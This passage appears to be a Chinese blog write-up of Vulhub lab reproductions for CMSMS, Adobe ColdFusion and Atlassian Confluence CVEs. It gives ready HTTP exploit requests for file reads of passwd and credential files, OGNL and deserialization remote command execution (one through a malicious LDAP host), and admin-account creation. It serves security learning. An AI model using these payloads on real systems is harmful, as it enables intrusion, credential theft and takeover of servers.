+<p>注:kali自带python2 3 但是3运行该py会报错 2又缺一些组件 pip2又不自带 安装很是麻烦<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/44.jpg" alt="44"><br>等他程序自己把密码爆出来就完事了</p>
+<h1 id="CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）"><a href="#CMS-Made-Simple-CMSMS-前台代码执行漏洞（CVE-2021-26120）" class="headerlink" title="CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）"></a>CMS Made Simple (CMSMS) 前台代码执行漏洞（CVE-2021-26120）</h1><blockquote>
+<p>CMS Made Simple（CMSMS）是一个免费的开放源码内容管理系统，为开发人员、程序员和网站所有者提供基于网络的开发和管理功能。</p>
+<p>Smarty 3.1.39 之前的版本允许在 <code>{function name=</code> 子串后注入PHP代码，导致代码注入漏洞，该漏洞即为CVE-2021-26120。</p>
+<p>CMS Made Simple 版本 &lt;= 2.2.15，拥有设计师权限的用户可以在后台利用服务端模板注入漏洞，即为前面提到的CVE-2021-26120。</p>
+<p>因此，如果CMSMS版本低于2.2.9.1，未授权的攻击者可以结合<a href="https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053">CVE-2019-9053</a>和CVE-2021-26120漏洞，在服务器上执行任意代码。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li>
+<li><a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-16"><a href="#漏洞复现-16" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先是配置<br>环境环境启动后，你需要访问<code>http://your-ip/install.php</code>并安装CMS服务。<br>安装过程请根据页面中的安装向导来进行，其中MySQL数据库的地址是<code>db</code>，数据库名是<code>cmsms</code>，账号和密码均为<code>root</code>。</p>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/43.jpg" alt="43"></p>
+<blockquote>
+<p>使用<a href="https://srcincite.io/pocs/cve-2021-26120.py.txt">https://srcincite.io/pocs/cve-2021-26120.py.txt</a>中分享的<a href="poc.py">POC</a>，可以使用SQL注入漏洞重置管理员密码，并执行任意命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">python poc.py 127.0.0.1 / id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/45.jpg" alt="45"></p>
+<p>可见，<code>id</code>命令已被成功执行。</p>
+<h1 id="Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h1><blockquote>
+<p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
+<p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p>
+</blockquote>
+<h2 id="漏洞复现-17"><a href="#漏洞复现-17" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>直接访问<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code>：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/46.jpg" alt="46"></p>
+<blockquote>
+<p>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/47.jpg" alt="47"></p>
+<h1 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h1><blockquote>
+<p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
+<p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></li>
+<li><a href="https://www.exploit-db.com/exploits/43993">https://www.exploit-db.com/exploits/43993</a></li>
+<li><a href="https://github.com/codewhitesec/ColdFusionPwn">https://github.com/codewhitesec/ColdFusionPwn</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-18"><a href="#漏洞复现-18" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn">ColdFusionPwn</a>工具来生成POC：</p>
+<pre class="line-numbers language-none"><code class="language-none">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 'touch /tmp/success' poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>POC生成于poc.ser文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为application/x-amf：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/48.jpg" alt="48"><br>这里burp用的是“粘贴文件至”来发送的数据包 不然容易出现错误<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/49.jpg" alt="49"><br>一般来说正常返回完文件也会被正常创建 但多半是ysoserial版本不对 没有正常创建</p>
+<blockquote>
+<p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p>
+<p>将POC改成<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">反弹命令</a>，成功拿到shell：</p>
+</blockquote>
+<h1 id="Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）"><a href="#Adobe-ColdFusion-本地文件包含漏洞（CVE-2023-26360）" class="headerlink" title="Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）"></a>Adobe ColdFusion 本地文件包含漏洞（CVE-2023-26360）</h1><blockquote>
+<p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
+<p>Adobe ColdFusion 2018 Update 15 和 2021 Update 5 版本及以前，存在一处文件包含漏洞。攻击者可以利用该漏洞在服务器上执行任意代码。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/13392">https://xz.aliyun.com/t/13392</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-19"><a href="#漏洞复现-19" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>发送如下请求即可读取文件<code>/proc/self/environ</code>：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1
+Host: localhost:8500
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 82
+Content-Type: application/x-www-form-urlencoded
+
+_variables={"_metadata":{"classname":"../../../../../../../../proc/self/environ"}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>你可以在返回包中找到Adobe ColdFusion的根目录<code>/opt/coldfusion/cfusion</code>：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/50.jpg" alt="50"></p>
+<blockquote>
+<p>从<code>../../../../../../../../opt/coldfusion/cfusion/lib/password.properties</code>中读取服务器密码：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/51.jpg" alt="51"></p>
+<blockquote>
+<p>想要利用文件包含漏洞执行任意代码，需要先发送如下请求来写入CFM脚本：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1
+Host: localhost:8500
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 67
+Content-Type: application/x-www-form-urlencoded
+
+_variables=&lt;cfexecute name='id' outputFile='/tmp/success' &gt;&lt;/cfexecute&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后包含日志文件，执行该CFM代码：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&amp;_cfclient=true HTTP/1.1
+Host: localhost:8500
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 111
+Content-Type: application/x-www-form-urlencoded
+
+_variables={"_metadata":{"classname":"../../../../../../../../opt/coldfusion/cfusion/logs/coldfusion-out.log"}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可见，<code>id</code>命令的执行结果已经被写入<code>/tmp/success</code>：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/52.jpg" alt="52"></p>
+<h1 id="Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）"><a href="#Adobe-ColdFusion-XML-反序列化命令执行漏洞（CVE-2023-29300）" class="headerlink" title="Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）"></a>Adobe ColdFusion XML 反序列化命令执行漏洞（CVE-2023-29300）</h1><blockquote>
+<p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
+<p>Adobe ColdFusion在2018.0.16、2021.0.6、2023.0.0.330468版本及以前，存在一处XML反序列化漏洞。攻击者可以利用该漏洞调用Java中任意setter方法，最终执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://blog.projectdiscovery.io/adobe-coldfusion-rce/">https://blog.projectdiscovery.io/adobe-coldfusion-rce/</a></li>
+<li><a href="https://xz.aliyun.com/t/13413">https://xz.aliyun.com/t/13413</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-20"><a href="#漏洞复现-20" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>要利用这个漏洞，需要先找到一个可利用的setter方法作为Gadget。最常见的Gadget是利用<code>com.sun.rowset.JdbcRowSetImpl</code>来进行JNDI注入，并执行任意命令。</p>
+<p>首先，启动一个恶意JNDI服务器，并加载<code>CommonsBeanutils1</code>作为内层反序列化Gadget。Github上有数个工具可以使用，比如<a href="https://github.com/rebeyond/JNDInjector/releases">https://github.com/rebeyond/JNDInjector/releases</a>：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/53.jpg" alt="53"></p>
+<blockquote>
+<p>然后，将恶意LDAP地址替换到如下请求中发送：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /CFIDE/adminapi/accessmanager.cfc?method=foo&amp;_cfclient=true HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 333
+
+argumentCollection=&lt;wddxPacket version='1.0'&gt;&lt;header/&gt;&lt;data&gt;&lt;struct type='xcom.sun.rowset.JdbcRowSetImplx'&gt;&lt;var name='dataSourceName'&gt;&lt;string&gt;ldap://192.168.0.196/PJlkCbYLJV/CommonsBeanutils1/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL3dvd3dlZGlkaXQifQ==&lt;/string&gt;&lt;/var&gt;&lt;var name='autoCommit'&gt;&lt;boolean value='true'/&gt;&lt;/var&gt;&lt;/struct&gt;&lt;/data&gt;&lt;/wddxPacket&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</blockquote>
+<p>localhost处改端口似乎是必要的 改完就成功复现了</p>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/54.jpg" alt="54"></p>
+<blockquote>
+<p>可见，<code>touch /tmp/success</code>已被成功执行：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/55.jpg" alt="55"></p>
+<h1 id="Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）"><a href="#Atlassian-Confluence-路径穿越与命令执行漏洞（CVE-2019-3396）" class="headerlink" title="Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）"></a>Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</h1><blockquote>
+<p>Atlassian Confluence是企业广泛使用的wiki系统，其6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。</p>
+<p>参考资料：</p>
+<ul>
+<li><a href="https://paper.seebug.org/884/">https://paper.seebug.org/884/</a></li>
+<li><a href="https://jira.atlassian.com/browse/CONFSERVER-57974">https://jira.atlassian.com/browse/CONFSERVER-57974</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-21"><a href="#漏洞复现-21" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>环境启动后，访问<code>http://your-ip:8090</code>会进入安装引导，选择“Trial installation”，之后会要求填写license key。点击“Get an evaluation license”，去Atlassian官方申请一个Confluence Server的测试证书：</p>
+<p>然后点击Next安装即可。这一步小内存VPS可能安装失败或时间较长（建议使用4G内存以上的机器进行安装与测试），请耐心等待。</p>
+<p>如果提示填写cluster node，路径填写<code>/home/confluence</code>即可：</p>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/56.jpg" alt="56"></p>
+<blockquote>
+<p>发送如下数据包，即可读取文件<code>web.xml</code>：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /rest/tinymce/1/macro/preview HTTP/1.1
+Host: localhost:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Referer: http://localhost:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;
+Content-Type: application/json; charset=utf-8
+Content-Length: 176
+
+{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/57.jpg" alt="57"></p>
+<h1 id="Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）"><a href="#Atlassian-Confluence-OGNL表达式注入命令执行漏洞（CVE-2021-26084）" class="headerlink" title="Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）"></a>Atlassian Confluence OGNL表达式注入命令执行漏洞（CVE-2021-26084）</h1><blockquote>
+<p>Atlassian Confluence是企业广泛使用的wiki系统，其部分版本中存在OGNL表达式注入漏洞。攻击者可以通过这个漏洞，无需任何用户的情况下在目标Confluence中执行任意代码。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html</a></li>
+<li><a href="https://jira.atlassian.com/browse/CONFSERVER-67940">https://jira.atlassian.com/browse/CONFSERVER-67940</a></li>
+<li><a href="https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md">https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></li>
+<li><a href="https://github.com/h3v0x/CVE-2021-26084_Confluence">https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
+<p>有多个接口可以触发这个OGNL表达式注入漏洞。</p>
+<h3 id="pages-doenterpagevariables-action"><a href="#pages-doenterpagevariables-action" class="headerlink" title="/pages/doenterpagevariables.action"></a>/pages/doenterpagevariables.action</h3><p>这个接口不需要登录即可利用，发送如下数据包，即可看到<code>233*233</code>已被执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /pages/doenterpagevariables.action HTTP/1.1
+Host: your-ip:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/58.jpg" alt="58"></p>
+<blockquote>
+<p>执行任意命令：</p>
+<pre class="line-numbers language-none"><code class="language-none">queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/59.jpg" alt="59"></p>
+<blockquote>
+<h3 id="pages-createpage-entervariables-action"><a href="#pages-createpage-entervariables-action" class="headerlink" title="/pages/createpage-entervariables.action"></a>/pages/createpage-entervariables.action</h3><p>这个路径也不需要用户登录：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /pages/createpage-entervariables.action HTTP/1.1
+Host: your-ip:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="pages-createpage-action"><a href="#pages-createpage-action" class="headerlink" title="/pages/createpage.action"></a>/pages/createpage.action</h3><p>这个接口需要一个可以创建页面的用户权限：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET /pages/createpage.action?spaceKey=EX&amp;src=quick-create&amp;queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027 HTTP/1.1
+Host: 192.168.1.162:8090
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://192.168.1.162:8090/template/custom/content-editor.vm
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
+Cookie: JSESSIONID=7B35600F54A9E303CE8C277ED960E1E7; seraph.confluence=524289%3A2ac32a308478b9cb9f0e351a12470faa4f2a928a
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</blockquote>
+<h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2022-26134）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2022-26134）</h1><blockquote>
+<p>Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新，通告了一个严重且已在野利用的代码执行漏洞，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html">https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html</a></li>
+<li><a href="https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis">https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-22"><a href="#漏洞复现-22" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+Host: your-ip:8090
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</blockquote>
+<p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/60.jpg" alt="60"></p>
+<h1 id="Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515"><a href="#Confluence-属性覆盖导致权限绕过漏洞-CVE-2023-22515" class="headerlink" title="Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)"></a>Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)</h1><blockquote>
+<p>Atlassian Confluence是企业广泛使用的wiki系统。</p>
+<p>2023年10月4日，Atlassian官方发布了对于CVE-2023-22515漏洞的补丁。这个漏洞是由属性覆盖导致，利用该漏洞攻击者可以重新执行Confluence安装流程并增加管理员账户。</p>
+<p>该漏洞不影响8.0.0以前的版本。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></li>
+<li><a href="https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis">https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis</a></li>
+</ul>
+</blockquote>
+<h2 id="漏洞复现-23"><a href="#漏洞复现-23" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote>
+<p>首先，最主要的请求就是覆盖目标Confluence服务器中的<code>bootstrapStatusProvider.applicationConfig.setupComplete</code>属性：</p>
+<pre class="line-numbers language-none"><code class="language-none">GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false HTTP/1.1
+Host: localhost:8090
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后，你就可以使用如下请求创建一个新的管理员账户<code>vulhub</code>：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /setup/setupadministrator.action HTTP/1.1
+Host: localhost:8090
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 110
+X-Atlassian-Token: no-check
+
+username=vulhub&amp;fullName=vulhub&amp;email=admin%40vulhub.org&amp;password=vulhub&amp;confirm=vulhub&amp;setup-next-button=Next<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发送如下请求完成安装步骤：</p>
+<pre class="line-numbers language-none"><code class="language-none">POST /setup/finishsetup.action HTTP/1.1
+Host: localhost:8090
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+X-Atlassian-Token: no-check
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后，直接使用新的<code>vulhub</code>账户（密码同样是<code>vulhub</code>）来登录Confluence，可见新的管理员已成功增加：</p>
+</blockquote>
+<p>老卡在第一步…没成功</p>
+<h1 id="Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）"><a href="#Confluence-OGNL表达式注入命令执行漏洞（CVE-2023-22527）" class="headerlink" title="Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）"></a>Confluence OGNL表达式注入命令执行漏洞（CVE-2023-22527）</h1><blockquote>
+<p>Atlassian Confluence是企业广泛使用的wiki系统。</p>
+<p>在Confluence 8.0到8.5.3版本之间，存在一处由于任意velocity模板被调用导致的OGNL表达式注入漏洞，未授权攻击者利用该漏洞可以直接攻击Confluence服务器并执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html">https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html</a></li>
+<li><a href="https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/">https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/</a></li>
+</ul>
+</blockquote>
